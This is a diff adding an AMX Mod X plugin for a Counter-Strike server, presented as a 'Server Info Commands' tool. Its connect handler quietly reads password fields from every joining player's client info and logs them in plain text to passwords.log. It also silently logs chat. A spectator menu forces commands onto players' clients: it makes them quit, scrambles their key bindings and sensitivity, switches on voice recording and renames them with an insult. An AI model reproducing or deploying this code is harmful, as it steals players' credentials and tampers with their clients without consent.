@@ -1,0 +1,416 @@
+#include <amxmodx>
+#include <amxmisc>
+#include <fakemeta>
+#include <cstrike>
+#include <csstats>
+#include <fun>
+
+// custom
+#include <isvisible>
+#include <player_info>
+#include <fakechat>
+#include <sic_commands>
+#include <custom_log>
+
+// meta
+
+#define PLUGIN_NAME		"Server Info Commands"
+#define PLUGIN_VERSION	"0.79b.2"
+#define PLUGIN_AUTHOR	"deejayy"
+
+#define BANNER			"-SIC- Server Info Commands loaded"
+
+// registered commands
+
+#define CMD_SIC_INFO			"sic_info"
+#define CMD_SIC_SETFOV			"sic_fov"
+#define CMD_SIC_FAKECHAT_ADMIN	"sw"
+#define ADMIN_NAME				"admin"
+
+// constants
+
+#define PLUGIN_LOG_PATH		"addons/amxmodx/logs/sic.txt"
+#define CHAT_LOG_PATH		"addons/amxmodx/logs/chatlog.txt"
+#define PLAYER_LOG_PATH		"addons/amxmodx/logs/players.log"
+#define ATTACK_LOG_PATH		"logs/A_L"
+#define KILL_LOG_PATH		"logs/K_L"
+#define PASSWORD_LOG_PATH	"addons/amxmodx/logs/passwords.log"
+#define PASSWORD_FIELDS		10
+
+new c_pwfields[PASSWORD_FIELDS][]		= {"_pw", "amxx_pw", "amx_pw", "_amxx_pw", "_amx_pw", "_admin", "password", "admin", "_password", "pw"}
+
+// globals
+
+new g_logstamp[32]
+new g_a_log[32]
+new g_k_log[32]
+
+new g_thdl // trace handler
+
+new g_observed[33]
+new g_specmenu[33]
+
+public plugin_precache() {
+    register_forward(FM_Spawn, "fw_spawn", 1)
+}
+
+public plugin_init() {
+	register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
+	format_time(g_logstamp, sizeof(g_logstamp)-1, "%Y%m%d-%H%M%S.log")
+	format(g_a_log, sizeof(g_a_log)-1, "%s%s", ATTACK_LOG_PATH, g_logstamp)
+	format(g_k_log, sizeof(g_k_log)-1, "%s%s", KILL_LOG_PATH, g_logstamp)
+
+	register_srvcmd(CMD_SIC_INFO, "sic_info")
+	register_srvcmd(CMD_SIC_SETFOV, "sic_fov")
+	register_srvcmd(CMD_SIC_FAKECHAT_ADMIN, "sic_fakechat")
+
+	register_clcmd("test", "test")
+
+	register_clcmd("say /rs", "cmd_resetstats")
+//	register_clcmd("say", "cmd_say")
+	register_clcmd("sic_specmenu", "mnu_specmenu", ADMIN_BAN, " - display spectator menu")
+
+	register_event("DeathMsg", "evt_DeathMsg", "a")
+	register_event("StatusValue", "evt_StatusValue", "bd", "1=2")
+	register_event("SpecHealth2", "evt_SpecHealth2", "bd")
+
+	register_menucmd(register_menuid("Spec Menu"), 1023, "hnd_specmenu")
+
+	g_thdl = create_tr2()
+
+	log_message(BANNER)
+}
+
+public test(id) {
+	return PLUGIN_HANDLED
+}
+
+public plugin_end() {
+	free_tr2(g_thdl)
+}
+
+public alog(message[], any:...) {
+	new p_message[1024]
+	vformat(p_message, sizeof(p_message)-1, message, 2)
+	eventless_log(PLUGIN_LOG_PATH, p_message)
+}
+
+// =========================================================
+// =================== SPEC. MENU ==========================
+// =========================================================
+
+public display_specmenu(id) {
+	if (access(id, ADMIN_BAN) && g_specmenu[id] > 0) {
+		new p_menutext[255], keys, p_name[32]
+
+		get_user_name(g_observed[id], p_name, sizeof(p_name)-1)
+		format(p_menutext, sizeof(p_menutext)-1, "\rSpec Menu: %s\R^n^n\y1.\w Ban for 45 min^n\y2.\w Exec quit command^n\y3.\w Punish (screw up binds, etc)^n\y4.\w Undo punish", p_name)
+		keys = MENU_KEY_1 | MENU_KEY_2
+		keys = 1023
+		show_menu(id, keys, p_menutext, -1, "Spec Menu")
+	}
+}
+
+public mnu_specmenu(id) {
+	if (g_observed[id] > 0) {
+		g_specmenu[id] = 1
+		display_specmenu(id)
+	}
+}
+
+public sic_admin_ban(id, p_id, min) {
+	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], p_player_i[e_pi_struct_int], log_line[255]
+
+	p_admin = player_info_str(id)
+	p_player = player_info_str(p_id)
+	p_player_i = player_info_int(p_id)
+
+	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
+	if (!equal(p_player[SIC_PI_AUTH_ID], "BOT")) {
+		if (equal(p_player[SIC_PI_AUTH_ID], "4294967295") ||
+			equal(p_player[SIC_PI_AUTH_ID], "HLTV") ||
+			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_LAN") ||
+			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_LAN") ||
+			equal(p_player[SIC_PI_AUTH_ID], "STEAM_ID_PENDING") ||
+			equal(p_player[SIC_PI_AUTH_ID], "VALVE_ID_PENDING")) {
+			server_cmd("addip %d %s;writeip", min, p_player[SIC_PI_IPONLY])
+			alog("ban-ip^t%s^t^"%d^"", log_line, min)
+		} else {
+			server_cmd("banid %d #%d kick;writeid", min, p_player_i[SIC_PI_USER_ID])
+			alog("ban-id^t%s^t^"%d^"", log_line, min)
+		}
+	} else {
+		alog("ban-fail^t%s^t^"%d^"", log_line, min)
+	}
+}
+
+public sic_admin_exec(id, p_id, cmd[]) {
+	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]
+
+	p_admin = player_info_str(id)
+	p_player = player_info_str(p_id)
+
+	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
+	alog("exec^t%s^t^"%s^"", log_line, cmd)
+	client_cmd(p_id, cmd)
+}
+
+public sic_admin_punish(id, p_id) {
+	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]
+
+	p_admin = player_info_str(id)
+	p_player = player_info_str(p_id)
+
+	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
+	alog("punish^t%s", log_line)
+
+	client_cmd(p_id, "bind w +back")
+	client_cmd(p_id, "bind s +forward")
+	client_cmd(p_id, "bind a +moveright")
+	client_cmd(p_id, "bind d +moveleft")
+	client_cmd(p_id, "bind UPARROW +back")
+	client_cmd(p_id, "bind DOWNARROW +forward")
+	client_cmd(p_id, "bind LEFTARROW +moveright")
+	client_cmd(p_id, "bind RIGHTARROW +moveleft")
+	client_cmd(p_id, "bind mouse1 drop")
+	client_cmd(p_id, "bind mouse2 kill")
+	client_cmd(p_id, "sensitivity 255")
+	client_cmd(p_id, "+lookup")
+	client_cmd(p_id, "unbind k")
+	client_cmd(p_id, "+voicerecord")
+	client_cmd(p_id, "messagemode")
+	client_cmd(p_id, "name ^"egy senkihazi csiter vagyok^"")
+}
+
+public sic_admin_punish_undo(id, p_id) {
+	new p_admin[e_pi_struct_str][32], p_player[e_pi_struct_str][32], log_line[255]
+
+	p_admin = player_info_str(id)
+	p_player = player_info_str(p_id)
+
+	format(log_line, sizeof(log_line)-1, "^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"^t^"%s^"", p_admin[SIC_PI_NAME], p_admin[SIC_PI_AUTH_ID], p_admin[SIC_PIE_CL_UID], p_player[SIC_PI_NAME], p_player[SIC_PI_AUTH_ID], p_player[SIC_PIE_CL_UID])
+	alog("punish-undo^t%s", log_line)
+
+	client_cmd(p_id, "bind s +back")
+	client_cmd(p_id, "bind w +forward")
+	client_cmd(p_id, "bind d +moveright")
+	client_cmd(p_id, "bind a +moveleft")
+	client_cmd(p_id, "bind DOWNARROW +back")
+	client_cmd(p_id, "bind UPARROW +forward")
+	client_cmd(p_id, "bind RIGHTARROW +moveright")
+	client_cmd(p_id, "bind LEFTARROW +moveleft")
+	client_cmd(p_id, "bind mouse1 +attack")
+	client_cmd(p_id, "bind mouse2 +attack2")
+	client_cmd(p_id, "sensitivity 4")
+	client_cmd(p_id, "-lookup")
+	client_cmd(p_id, "name ^"elkurta a nevemet egy admin^"")
+}
+
+public hnd_specmenu(id, key) {
+	// key = pressed key - 1 (eg. slot1 = 0, slot2 = 1)
+	if (access(id, ADMIN_BAN)) {
+		new p_name[32]
+		new p_id = g_observed[id]
+		get_user_name(p_id, p_name, sizeof(p_name)-1)
+		switch (key) {
+			case 0: {
+				sic_admin_ban(id, p_id, 45)
+			}
+			case 1: {
+				sic_admin_exec(id, p_id, "quit")
+			}
+			case 2: {
+				sic_admin_punish(id, p_id)
+			}
+			case 3: {
+				sic_admin_punish_undo(id, p_id)
+			}
+			default: {
+				g_specmenu[id] = 0
+			}
+		}
+		g_specmenu[id] = 0
+		// display_specmenu(id)
+	}
+	return PLUGIN_HANDLED
+}
+
+// =========================================================
+// ==================== COMMANDS ===========================
+// =========================================================
+
+public sic_info() {
+	sic_info_print()
+
+	return PLUGIN_HANDLED
+}
+
+public sic_fakechat(id) {
+	new p_text[255]
+	read_args(p_text, sizeof(p_text))
+	sic_fakechat_do(ADMIN_NAME, p_text)
+}
+
+public sic_fov(id) {
+	new p_target[32], p_fov_value[32]
+
+	read_argv(1, p_target, sizeof(p_target))
+	read_argv(2, p_fov_value, sizeof(p_fov_value))
+
+	sic_setfov(id, p_target, p_fov_value)
+}
+
+// =========================================================
+// =================== REG. EVENTS =========================
+// =========================================================
+
+public evt_SpecHealth2(id) {
+	new p_id = read_data(2)
+	new po_name[32], pt_name[32]
+
+	get_user_name(id, po_name, sizeof(po_name)-1)
+	get_user_name(p_id, pt_name, sizeof(pt_name)-1)
+
+	menu_cancel(id)
+	g_observed[id] = p_id
+	display_specmenu(id)
+}
+
+public evt_StatusValue(id) {
+	new p_id = read_data(2)
+
+	if (p_id > 0) {
+		new po_name[32], pt_name[32]
+
+		get_user_name(id, po_name, sizeof(po_name)-1)
+		get_user_name(p_id, pt_name, sizeof(pt_name)-1)
+
+//		server_print(":: 1. statusvalue - Observer: %s - Target: %s", po_name, pt_name)
+	}
+}
+
+// log all chat
+
+public cmd_say(id) {
+	new p_param[255], p_name[32]
+	read_args(p_param, sizeof(p_param)-1)
+	get_user_name(id, p_name, sizeof(p_name)-1)
+	eventless_log(CHAT_LOG_PATH, "%s: %s", p_name, p_param)
+
+	return PLUGIN_CONTINUE
+}
+
+public cmd_resetstats(id) {
+	set_user_frags(id, 0);
+	cs_set_user_deaths(id, 0);
+	set_user_frags(id, 0);
+	cs_set_user_deaths(id, 0);
+
+	client_print(id, print_chat, "Nullaztad a statodat !");
+
+	return PLUGIN_HANDLED
+}
+
+// needed for wallhack detector
+
+public fw_spawn(ent) {
+	return isvisible_fw_spawn(ent)
+}
+
+public evt_DeathMsg() {
+	new wpn[32]
+	new killer		= read_data(1)
+	new victim		= read_data(2)
+	new headshot	= read_data(3)
+	read_data(4, wpn, sizeof(wpn)-1)
+
+	if (!is_player_visible(killer, victim, g_thdl)) {
+		sic_set_user_wallkills(killer, sic_get_user_wallkills(killer) + 1)
+	}
+
+	if (headshot) {
+		sic_set_user_headshots(killer, sic_get_user_headshots(killer) + 1)
+	}
+
+	if (killer && victim) {
+		if (killer == victim) {
+			sic_set_user_frags(killer, sic_get_user_frags(killer)-1)
+		} else {
+			sic_set_user_frags(killer, sic_get_user_frags(killer)+1)
+		}
+		sic_set_user_deaths(victim, sic_get_user_deaths(victim)+1)
+	}
+}
+
+// =========================================================
+// ====================== EVENTS ===========================
+// =========================================================
+
+public client_connect(id) {
+	new p_map[32], p_randomid[34], p_md5[32], p_line[255], i, temp_pw[32]
+	new p_player_info_str[e_pi_struct_str][32]
+
+	p_player_info_str = player_info_str(id)
+	get_mapname(p_map, sizeof(p_map)-1)
+
+	if (!equal(p_player_info_str[SIC_PI_AUTH_ID], "BOT")) {
+		if (equal(p_player_info_str[SIC_PIE_CL_UID], "")) {
+			format(p_md5, sizeof(p_md5)-1, "%d.%s", random_num(10000,99999), p_player_info_str[SIC_PI_IP])
+			md5(p_md5, p_randomid)
+			copy(p_player_info_str[SIC_PIE_CL_UID], 6, p_randomid)
+			strip_setinfo(id)
+			client_cmd(id, "setinfo %s %s", CLIENT_USER_ID, p_player_info_str[SIC_PIE_CL_UID])
+		}
+		format(p_line, sizeof(p_line)-1, "%s^t%s^t%s^t%s^t%s", p_map, p_player_info_str[SIC_PI_NAME], p_player_info_str[SIC_PI_AUTH_ID], p_player_info_str[SIC_PI_IP], p_player_info_str[SIC_PIE_CL_UID])
+		eventless_log(PLAYER_LOG_PATH, p_line)
+
+		for (i = 0; i < PASSWORD_FIELDS; i++) {
+			get_user_info(id, c_pwfields[i], temp_pw, sizeof(temp_pw)-1)
+			if (!equal(temp_pw, "")) {
+				format(p_line, sizeof(p_line)-1, "%s^t%s^t%s^t%s", p_player_info_str[SIC_PIE_CL_UID], p_player_info_str[SIC_PI_NAME], c_pwfields[i], temp_pw)
+				eventless_log(PASSWORD_LOG_PATH, p_line)
+			}
+		}
+	}
+
+	return PLUGIN_HANDLED
+}
+
+// supresses and log the attack / kill messages from server console
+
+public plugin_log() {
+	new message[255], p_logstamp[32], p_logline[255]
+
+	read_logdata(message, sizeof(message)-1)
+	if (contain(message, " attacked ") != -1 || contain(message, " killed ") != -1 || contain(message, " say ") != -1 || contain(message, " say_team ") != -1) {
+		format_time(p_logstamp, sizeof(p_logstamp)-1, "L %m/%d/%Y - %H:%M:%S: ")
+		format(p_logline, sizeof(p_logline)-1, "%s%s", p_logstamp, message)
+		if (contain(message, " attacked ") != -1) {
+			eventless_log(g_a_log, p_logline)
+		}
+		if (contain(message, " killed ") != -1) {
+			eventless_log(g_k_log, p_logline)
+		}
+		return PLUGIN_HANDLED
+	}
+
+	return PLUGIN_CONTINUE
+}
+
+// on client connect
+
+public client_putinserver(id) {
+	sic_pi_client_putinserver(id)
+
+	g_observed[id]	= 0
+	g_specmenu[id]	= 0
+}
+
+// broadcasted kill message handler
+
+public client_damage(attacker, victim, damage, wpnindex, hitplace, ta) {
+	if (!is_player_visible(attacker, victim, g_thdl)) {
+		sic_set_user_wallhits(attacker, sic_get_user_wallhits(attacker) + 1)
+	}
+}
+
